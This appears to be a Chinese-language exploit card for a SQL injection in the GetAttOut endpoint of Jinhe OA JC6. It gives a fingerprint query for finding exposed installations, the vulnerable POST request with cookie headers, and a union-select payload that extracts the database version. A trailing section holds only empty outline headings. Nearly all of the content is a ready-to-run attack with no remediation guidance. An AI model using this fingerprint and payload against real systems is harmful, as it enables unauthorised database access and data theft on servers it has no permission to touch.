# 金和OAJC6GetAttOut存在sql注入

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=7D7F9059114C952E2EE944538F3209E8; JSESSIONID=570EB1805FAA212E05C191C5…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 52`

**请求体 / payload**
```
1' union select null,null,@@version,null,null,null--
```

**其他**
- 金和OA JC6 GetAttOut存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA